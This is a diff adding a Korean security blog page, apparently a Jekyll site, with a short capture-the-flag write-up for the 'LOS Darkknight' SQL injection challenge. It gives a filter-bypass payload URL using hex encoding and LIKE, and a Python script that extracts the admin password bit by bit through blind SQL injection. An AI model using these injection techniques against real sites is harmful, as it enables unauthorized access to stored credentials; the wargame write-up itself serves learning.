@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Tempuss Blog" /></head>
+<style>@import url(/public/css/syntax/monokai.css);</style>
+  <title>Tempuss Blog</title>
+  <!-- <link href="/public/css/bootstrap.min.css" rel="stylesheet"> -->
+
+  <link href="/public/css/style.css" rel="stylesheet">
+  <body>
+  	<div class="container"> 
+		<div class="sidebar">
+			<div class="sidebar-item sidebar-header">
+	<div class='sidebar-brand'>
+		<a href="/about/">Tempuss Blog</a>
+	</div>
+	<p class="lead">보안하는 개발자</p></div>
+
+<div class="sidebar-item sidebar-nav">
+	<ul class="nav">
+      <li class="nav-title">Pages</li>
+	  <li>
+	  	<a class="nav-item" href="/">Articles</a>
+	  </li>
+	  
+	  
+	    
+	  
+	    
+	      
+	        <li>
+	        	<a class="nav-item" href="/about/">
+	            	About
+	            </a>
+	        </li>
+	      
+	    
+	  
+	    
+	      
+	    
+	  
+	    
+	  
+	    
+	  
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-nav">
+  	<ul class="nav">
+			<li class="nav-title">Categories</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Hacking">
+				<span class="name">Hacking</span>
+				<span class="badge">39</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Web">
+				<span class="name">Web</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#BoB">
+				<span class="name">BoB</span>
+				<span class="badge">9</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Data-Engineering">
+				<span class="name">Data-Engineering</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	  </nav>
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-footer">
+	<p>Powered by <a href="https://github.com/jekyll/jekyll">Jekyll</a></p>
+</div>
+		</div>
+		<div class="content">
+			<article class="post">
+	<header class="post-header">
+		<div class="post-title"> 
+			LOS Darkknight
+		</div>
+		<time class="post-date dt-published" datetime="2015-10-22T18:14:00+09:00" itemprop="datePublished">2015/10/22
+		</time>		
+	</header>
+
+	<div class="post-content">
+		<p>pw 는 ‘가 필터링 되므로  no  부분에서 공격</p>
+
+<p>substr, ascii, = 이 필터링 되므로 admin 을  hex로 바꾸고</p>
+
+<p>=대신 like를 써서 공격한다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://los.sandbox.cash/chall/darkknight_141d7d5d93452a2e1f8c1ab8ecb81a92.php?no=0||id%20like%200x61646d696e%26%26mid(lpad(bin(ord(mid(pw,1,1))),8,0),8,1)
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+ 
+ 
+ 
+key=""
+site=""
+q=0
+w=1
+header={'Cookie':'PHPSESSID='}
+for j in range(1,12):
+        for i in reversed(range(1,9)):
+                site="http://los.sandbox.cash/chall/darkknight_141d7d5d93452a2e1f8c1ab8ecb81a92.php?no="
+                site+="0||id%20like%200x61646d696e%26%26mid(lpad(bin(ord(mid(pw,"+str(j)+",1))),8,0),"+str(i)+",1)"
+                print (site)
+                r=requests.put(site,headers=header)
+                
+                if "&lt;br&gt;&lt;h2&gt;Hello admin" in r.text:
+                  q+=w
+                w=w*2
+        key+=chr(q)
+        print ("\nkey : "+key+"\n")
+        q=0
+        w=1
+                
+</code></pre></div></div>
+
+<p>예전에 풀었던 풀이는 잃어버려서 진우껄 빌려왔다.</p>
+
+<p>출처 : http://unknown84.tistory.com/16</p>
+
+
+	</div>
+</article>
+		</div>
+	</div>
+  </body>
+</html>
